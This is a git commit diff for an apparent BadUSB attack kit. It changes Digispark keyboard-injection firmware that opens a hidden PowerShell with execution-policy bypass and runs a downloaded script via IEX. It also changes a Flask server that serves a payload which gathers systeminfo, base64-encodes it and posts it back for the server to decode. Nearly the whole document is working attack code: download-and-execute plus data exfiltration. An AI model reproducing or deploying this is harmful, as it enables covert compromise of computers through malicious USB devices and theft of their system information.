ff325e8c8549d78452fa4cc3bf66cfa547527ae9
Mingda Song <songmingda1234@hotmail.com>
2018-05-26 15:01:18 +0800

    modified:   bad_server.py 	modified:   bad_usb.ino

--- bad_server.py
+++ bad_server.py
@@ -1,12 +1,25 @@
 # This file gives an example of sending the attack payload back to the target
 
-from flask import Flask
+from flask import Flask, request
+import base64
 
 app = Flask('__main__')
+payload = '''
+$i=systeminfo
+$b=[System.Text.Encoding]::UTF8.GetBytes($i);
+$p=@{d=[System.Convert]::ToBase64String($b)}
+IWR -Uri 127.0.0.1 -Method POST -Body $p;
+'''
 
 @app.route('/', methods = ['POST', 'GET'])
 def root():
-	return 'echo "you\'ve got pwned!"'
+	if request.method == 'POST':
+		data = request.form.get('d')
+		plain = base64.b64decode(data).decode('UTF-8')
+		print plain
+		return ''
+	else:
+		return payload
 
 if __name__ == '__main__':
-	app.run(port = 80)
+	app.run(port = 80, use_reloader = True)
--- bad_usb.ino
+++ bad_usb.ino
@@ -1,15 +1,16 @@
 #include "DigiKeyboard.h"
 
 // Attack Header
-#define HEADER "PowerShell -WindowStyle Hidden \"&{"
+#define HEADER "PowerShell -w hid -ep bypass \"&{"
 
 // Attack payload
-// Note that this payload shouldn't exceeds 224 characters, the lesser the better.
-#define PAYLOAD "IEX $(curl 127.0.0.1).Content"
+// Note that this payload, along with header and tailer, should not be exceeding 260 characters. The lesser the better.
+#define PAYLOAD "IEX $(IWR 127.0.0.1).Content"
 
 #define TAILER "}\""
 
 void setup() {
+  DigiKeyboard.sendKeyStroke(0);
   // Sending the compose key: Win+R.
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   // Delay a little bit, make sure the Run window is correctly started.
